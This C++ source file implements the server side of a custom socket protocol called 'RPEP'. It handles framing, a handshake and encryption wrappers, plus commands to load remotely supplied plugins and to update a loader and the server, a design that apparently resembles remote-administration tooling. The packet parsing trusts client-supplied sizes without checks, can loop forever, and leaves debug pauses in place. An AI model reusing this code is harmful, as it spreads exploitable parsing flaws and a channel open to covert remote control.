#undef UNICODE
#include "RPEP.h"
#include "PluginManager.h"
#include "plugininterface.h"

#define MinBlockSize 1024

RPEP::RPEP(SOCKET hConexion,HCRYPTKEY hKey){
    Port = NULL;
    CompresAlg = PortCount = 0;
    ver = (version){0,0};
    MaxPaquetSize = 4096*4;
    runing = true;
    ver.High = 1;
    ver.Low = 0;
    this->hKey = hKey;

    printf("RPEP::ctor \n");
    conexion.setSocketDescriptor(hConexion);
    this->hConexion = hConexion;

}
RPEP::~RPEP(){}

ulong RPEP::clientLoop(){
    return 0;
}
ulong RPEP::serverLoop(){
    DArray readBuff,writeBuff,extraBuff;
    char buff[4096];

    //printf("serverLoop::MakeServerHello \n");
    MakeServerHello(writeBuff);
    //printf("serverLoop::encript(writeBuff) \n");
    //encript(writeBuff);
    //conexion.write(writeBuff);

    send(hConexion,(char*)writeBuff.data,writeBuff.size,0);
    printf("writeBuff.size %d \n",(int)writeBuff.size);

    writeBuff.Vaciar();
    do{
        for(int i = 0;(i = recv(hConexion,buff,sizeof(buff),0));){
            printf("recv i= %d\n",i);
            if((i > 0) && (i != -1)){
                readBuff.addData(buff,i);
                if(((uint)i)<sizeof(buff))break;
            }else{
                if(i == -1){
                    runing = false;
                    printf("Conexion perdida\n");
                }
                break;
            }
        }
        if(runing){
            //conexion.read(readBuff);
            //decript(readBuff);
            if(procesPkg(readBuff,writeBuff,extraBuff)){
                readBuff.Vaciar();
                if(writeBuff.size){
                    send(hConexion,(char*)writeBuff.data,writeBuff.size,0);
                    //conexion.write(writeBuff);
                }
            }
            Sleep(1);
        }
        //printf("serverLoop \n");
    }while(runing);

    return 0;
}

uint RPEP::MakePacket(DArray &outBuff, RPEP_HEADER::Operation op, const void *data, ulong size){
    return MakePacket(outBuff,true,op,data,size);
}
uint RPEP::MakePacket(DArray &outBuff, ushort pluginID, const void *data, ulong size){
    return MakePacket(outBuff,false,pluginID,data,size);
}
uint RPEP::MakePacket(DArray &outBuff, bool IsOperation, ushort opOrIDCode, const void *data, ulong size){
    RPEP_HEADER header;
    printf("sizeof(header) = %d \n",sizeof(header));

    //Aqui aparece el tipo de codificacion usada para el tamaño
    header.Size.bBlocks = size>MaxPaquetSize;
    //Indico el tipo de operacion
    header.opType.bOperation = IsOperation;

    printf("IsOperation %x\n",IsOperation);

    header.opType.Operation = opOrIDCode;
    header.BlockIndex = 0;

    //Segun el tipo de tamaño usado se agrega de una u otra manera
    if(header.Size.bBlocks){
        header.Size.Blocks = size/MaxPaquetSize;
        //En caso de no caver en un solo paquete, lo voy dividiendo en trozos el contenido
        for(;header.BlockIndex<header.Size.Blocks;header.BlockIndex++){
            //Agrego la cabecera
            outBuff.addData(&header,sizeof(header));
            //Agrego los datos frgmentados
            outBuff.addData(((char*)data)+header.BlockIndex*MaxPaquetSize,
                            ((((header.BlockIndex+1)*MaxPaquetSize)<=size)?MaxPaquetSize:size%MaxPaquetSize));
        }

    }else{
        header.Size.Bytes = size;
        outBuff.addData(&header,sizeof(header));
        outBuff.addData(data,size);
    }
    printf("header.Size.Bytes %d \nheader.opType.bOperation %d \n",(int)header.Size.Bytes,(int)header.opType.bOperation);
    return 0;
}


uint RPEP::MakeServerHello(DArray& outBuff){
    //Buffert en pila para el hello
    static ulong* CompresAlg = {};
    ulong CompresAlgCount = 0;
    uint buffSize = sizeof(RPEP_SERVER_HANDSHAKE)+CompresAlgCount*sizeof(RPEP_SERVER_HANDSHAKE::SupportedCompressionAlgm);
    char buff[buffSize];
    register RPEP_SERVER_HANDSHAKE* sHello = (RPEP_SERVER_HANDSHAKE*)buff;

    *((version*)&sHello->Version) = ver;
    sHello->MaxBlockSize = MaxPaquetSize;
    sHello->SupportedCompressionAlgmCount = CompresAlgCount;
    if(CompresAlgCount)memcpy(sHello->SupportedCompressionAlgm,CompresAlg,CompresAlgCount*sizeof(RPEP_SERVER_HANDSHAKE::SupportedCompressionAlgm));

    printf("MakeServerHello \n");
    MakePacket(outBuff,RPEP_HEADER::Operation::ServerHandshake,buff,buffSize);

    return 0;
}
uint RPEP::MakeError(DArray& outBuff,uint code){
    RPEP_ERROR error;

    ZeroMemory(&error,sizeof(error));
    error.Code = code;

    return MakePacket(outBuff,RPEP_HEADER::Operation::Error,&error,sizeof(error));
}

bool RPEP::procesPkg(DArray& in, DArray& out, DArray &extraBuff){
    bool result = true;
    RPEP_HEADER* header = (RPEP_HEADER*)in.data;
    if(in.size){
        printf("procesPkg \n");
        printf("header \n\tbBlocks %x\n\tOperation %x\n",(uint)header->Size.bBlocks,(uint)header->opType.Operation);
        while(result && in.size){
            if(header->Size.bBlocks){

            }else{
                if(!((header->Size.Bytes+sizeof(RPEP_HEADER)) > in.size)){
                    procesCMD(header->opType,header->Data,header->Size.Bytes,out);
                    if((header->Size.Bytes+sizeof(RPEP_HEADER)) == in.size){
                        in.Vaciar();
                    }else{
                        in.DelData(0,header->Size.Bytes+sizeof(RPEP_HEADER));
                    }
                }
            }
        }
    }


    return result;
}
bool RPEP::procesCMD(RPEP_HEADER::OperationType opType, char* data,uint size,DArray& response){
    bool result = false;

    printf("procesCMD \n");
    if(opType.bOperation){
        printf("comando interno\n");
        switch(opType.Operation){
            case RPEP_HEADER::Operation::ClientHandshake:
                printf("ClientHandshake \n");
                processClientHello((RPEP_CLIENT_HANDSHAKE*)data,response);
                break;
            case RPEP_HEADER::Operation::ServerHandshake:
                printf("ServerHandshake \n");
                break;
            case RPEP_HEADER::Operation::SetBlockSize:
                printf("SetBlockSize \n");
                break;
            case RPEP_HEADER::Operation::SetCompressionAlgm:
                printf("SetCompressionAlgm \n");
                break;
            case RPEP_HEADER::Operation::PingRequest:
                printf("PingRequest \n");
                break;
            case RPEP_HEADER::Operation::PingResponse:
                printf("PingResponse \n");
                break;
            case RPEP_HEADER::Operation::Error:
                printf("Error \n");
                break;
            //
            case RPEP_HEADER::Operation::LoadPlugin:
                printf("LoadPlugin \n");
                result = PlugMgr.loadPlugin((RPEP_LOAD_PLUGIN*)data);
                break;
            case RPEP_HEADER::Operation::CancelPluginLoad:
                printf("CancelPluginLoad \n");
               break;
            case RPEP_HEADER::Operation::InitPlugin:
                printf("InitPlugin \n");
               break;
            case RPEP_HEADER::Operation::StopPlugin:
                printf("StopPlugin \n");
               break;
            case RPEP_HEADER::Operation::UnloadPlugin:
                printf("UnloadPlugin \n");
               break;
            case RPEP_HEADER::Operation::EnumLoadedPlugins:
                printf("EnumLoadedPlugins \n");
               break;
            //
            case RPEP_HEADER::Operation::UpdateLoader:
                printf("UpdateLoader \n");
               break;
            case RPEP_HEADER::Operation::UpdateServer:
                printf("UpdateServer \n");
               break;
            case RPEP_HEADER::Operation::StopServer:
                printf("StopServer \n");
               break;
            default:
                printf("default \n");
               //Desconocido
               ;
        }
    }else{
        printf("comando para prugin\n");
        plugin* currentPlugin;
        if((currentPlugin = PlugMgr.getPluginById(opType.PluginID))){
            currentPlugin->plugInterface->onReciveData(data,size);
        }
    }
    return result;
}

bool RPEP::processClientHello(RPEP_CLIENT_HANDSHAKE *clientHello,DArray& response){
    bool result = false;
    int error = -1;
    if(clientHello){
       MessageBox(0,"pause","pause",0);
       printf("ClientHello \n\tMaxBlockSize %x\n\tPortCount %x\n\tCompressionALGM %x\n\tVersion %x.%x\n",
              clientHello->MaxBlockSize,
              clientHello->PortCount,
              clientHello->CompressionALGM,
              clientHello->Version.High,
              clientHello->Version.Low);

       if(clientHello->MaxBlockSize >= MinBlockSize && (ver.High >= clientHello->Version.High)
               && (ver.Low >= clientHello->Version.Low)){

           ver.High = clientHello->Version.High;
           ver.Low = clientHello->Version.Low;
           setMaxPaquetSize(clientHello->MaxBlockSize);

           setPort(clientHello->Port,clientHello->PortCount);
           setCompresAlg(clientHello->CompressionALGM);

           error = 0;
       }
       MakeError(response,error);
    }
    return result;
}


void RPEP::setMaxPaquetSize(ulong s){
    MaxPaquetSize = s;
}

void RPEP::setCompresAlg(ulong CompresAlg){
    this->CompresAlg = CompresAlg;
}

void RPEP::setPort(ushort *Port, ulong count){
    if(count && Port){
        this->Port = (ushort*)malloc(count*sizeof(*Port));
        memcpy(this->Port,Port,count*sizeof(*Port));
    }
}


bool RPEP::encript(DArray &data){
    if(data.size){
        //Coloco el padding  si hace falta
        if(data.size &0xf){
            for(int i = 0;data.size &0xf;i++){
                data.addData("\0",1);
            }
            CryptEncrypt(hKey,0,true,0,data.data,&data.size,data.size);
        }
    }
    return false;
}

bool RPEP::decript(DArray &data){
    if(data.size){
        return CryptDecrypt(hKey,0,true,0,data.data,&data.size);
    }
    return false;
}
